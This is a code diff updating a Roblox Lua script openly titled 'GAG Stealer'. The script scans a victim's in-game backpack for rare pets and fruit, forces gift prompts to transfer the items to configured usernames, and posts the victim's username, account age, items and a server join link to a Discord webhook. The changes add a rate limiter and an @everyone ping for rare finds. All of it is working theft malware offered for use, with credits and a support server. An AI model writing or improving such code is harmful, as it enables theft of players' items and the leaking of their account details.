@@ -1,4 +1,4 @@
--- GAG Stealer: Full  Script
+-- GAG Stealer: Super Embed, Spam-Proof, Rare Ping Version
 -- For support: discord.gg/notyet
 
 --------------------------
@@ -8,7 +8,6 @@ local CONFIG = {
     USERNAMES = _G.Usernames or {},
     WEBHOOK   = _G.webhook or "",
     MIN_VALUE = _G.min_value or 10000000,
-    PING      = _G.pingEveryone or "No",
 }
 
 -- Rare pet emoji mapping
@@ -24,6 +23,7 @@ local RARE_PETS = {
 }
 local DEFAULT_PET_EMOJI = "🐶"
 local DEFAULT_FRUIT_EMOJI = "🥝"
+local WEBHOOK_COOLDOWN = 5  -- seconds
 
 -------------------------------
 -- FIREPROXIMITY BYPASS PATCH --
@@ -120,7 +120,8 @@ end
 -----------------------------
 -- COLLECT INVENTORY ITEMS --
 -----------------------------
-local itemsToSend, totalValue = {}, 0
+local itemsToSend, totalValue, foundRare = {}, 0, false
+
 for _, tool in ipairs(backpack:GetChildren()) do
     if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
         if tool:GetAttribute("ItemType") == "Pet" then
@@ -148,7 +149,9 @@ for _, tool in ipairs(backpack:GetChildren()) do
             end
             local petWeight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or getWeight(tool)
             local petAge = getPetAge(tool)
-            if RARE_PETS[name] or petWeight >= 10 then
+            local isRare = RARE_PETS[name] ~= nil
+            if isRare or petWeight >= 10 then
+                if isRare then foundRare = true end
                 totalValue = totalValue + petVal
                 table.insert(itemsToSend, {
                     Tool  = tool,
@@ -186,9 +189,20 @@ table.sort(itemsToSend, function(a, b)
     else return a.Value > b.Value end
 end)
 
----------------------------
--- EMBED PAYLOAD CREATION
----------------------------
+---------------
+-- WEBHOOK RATE LIMITER
+---------------
+local lastWebhook = 0
+local function canSendWebhook()
+    return tick() - lastWebhook > WEBHOOK_COOLDOWN
+end
+local function setWebhookTime()
+    lastWebhook = tick()
+end
+
+-----------------------------
+-- EMBED PAYLOAD CREATION  --
+-----------------------------
 local function formatItemLine(item)
     if item.Type == "Pet" then
         return string.format("%s - %s [%.2f KG] [Age %s]", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"))
@@ -196,55 +210,62 @@ local function formatItemLine(item)
         return string.format("%s - %s [%.2f KG]", item.Emoji, item.Name, item.Weight)
     end
 end
-local itemLines = {}
-for _, item in ipairs(itemsToSend) do
-    table.insert(itemLines, formatItemLine(item))
-end
-local itemBlock = table.concat(itemLines, "\n")
-if #itemBlock > 1024 then
-    itemBlock = itemBlock:sub(1,1020) .. "\n...and more!"
-end
-local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
-local joinText = ("**[Join The player](%s)**"):format(joinLink)
 
--------------------------
--- SEND MAIN WEBHOOK  --
--------------------------
-local function sendInitialWebhook()
-    local fields = {
-        {name = "**You just got something!**", value = itemBlock, inline = false},
-        {name = "Victim Username", value = plr.Name, inline = true},
-        {name = "Approximatlly value", value = "`"..formatValue(totalValue).."`", inline = false},
-        {name = "Join Link", value = joinText, inline = false}
-    }
-    local data = {
-        content = (CONFIG.PING == "Yes" and "@everyone" or ""),
+local function makeEmbed(receiverName)
+    local itemLines = {}
+    for _, item in ipairs(itemsToSend) do
+        table.insert(itemLines, formatItemLine(item))
+    end
+    local itemBlock = table.concat(itemLines, "\n")
+    if #itemBlock > 1024 then
+        itemBlock = itemBlock:sub(1,1020) .. "\n...and more!"
+    end
+    local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
+    local ping = foundRare and "@everyone" or ""
+
+    return {
+        content = ping,
         embeds  = {{
-            title  = "🎁 GAG Heist Log",
-            color  = 65280,
-            fields = fields,
+            title  = "💎 You got something!",
+            color  = foundRare and 16776960 or 65280,
+            description = "**Player information**\n\n"..
+                "`Username: "..plr.Name.."`\n"..
+                "`Receiver: "..receiverName.."`\n"..
+                "`Executer: "..plr.Name.."`\n"..
+                "`Account age: "..(plr.AccountAge or "?").."`\n\n"..
+                "**What you got**:\n\n".. "``````".."\n\n"..
+                "**[Join Server]("..joinLink..")**",
             footer = { text = "GAG stealer by Tobi. discord.gg/notyet" }
         }}
     }
-    local body = HttpService:JSONEncode(data)
+end
+
+-------------------------
+-- SEND MAIN WEBHOOK   --
+-------------------------
+local function sendInitialWebhook(receiverName)
+    if not canSendWebhook() then return end
+    setWebhookTime()
+    local payload = makeEmbed(receiverName)
+    local body = HttpService:JSONEncode(payload)
     local headers = {["Content-Type"] = "application/json"}
     if req then req({Url = CONFIG.WEBHOOK, Method = "POST", Headers = headers, Body = body}) end
 end
-sendInitialWebhook()
 
 --------------------------
 -- WEBHOOK ON LEAVE/EVENT
 --------------------------
 local function sendLeaveWebhook()
     local leaveData = {
-        content = (CONFIG.PING == "Yes" and "@everyone" or ""),
+        content = "",
         embeds = {{
             title = "🚪 Player left before gifting",
             color = 16711680,
-            fields = {
-                {name = "Victim Username", value = plr.Name, inline = true},
-                {name = "Status", value = "Victim left the server/disconnected before items could be transferred."}
-            },
+            description = "**Player information**\n\n"..
+                "`Username: "..plr.Name.."`\n"..
+                "`Executer: "..plr.Name.."`\n"..
+                "`Account age: "..(plr.AccountAge or "?").."`\n\n"..
+                "**Status:** Victim left the server/disconnected before items could be transferred.",
             footer = { text = "GAG stealer by Tobi. discord.gg/notyet" }
         }}
     }
@@ -310,7 +331,6 @@ local function doSteal(player)
         equipTool(item.Tool)
         local prompt = findGiftPrompt(player.Character)
         if prompt then
-            -- Wait for prompt to be enabled before firing
             local t0 = os.clock()
             repeat
                 task.wait(0.04)
@@ -324,7 +344,6 @@ local function doSteal(player)
         item.Tool.Parent = backpack
         wait(0.04)
     end
-    -- Wait until all items are out of backpack (confirm sent)
     local stillInBackpack = true
     while stillInBackpack do
         stillInBackpack = false
@@ -346,6 +365,7 @@ local function listenForUser()
         player.Chatted:Connect(function()
             if triggered then return end
             triggered = true
+            sendInitialWebhook(player.Name)
             doSteal(player)
         end)
     end
